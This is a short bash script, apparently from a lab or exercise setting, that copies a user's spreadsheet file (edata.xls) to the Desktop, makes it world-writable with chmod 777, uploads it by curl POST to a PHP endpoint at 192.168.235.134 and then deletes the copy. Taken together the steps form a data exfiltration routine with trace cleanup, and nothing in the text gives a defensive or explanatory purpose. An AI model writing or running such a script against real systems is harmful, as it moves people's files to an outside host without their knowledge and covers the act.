
#!/bin/bash





cp /home/person2/Documents/edata.xls /home/person2/Desktop/file1.xls

chmod 777 /home/person2/Desktop/file1.xls

curl -i -X POST -H "Content-Type: multipart/form-data" -F "uploadedfile=@/home/person2/Desktop/file1.xls" http://192.168.235.134/index.php

rm -r /home/person2/Desktop/file1.xls
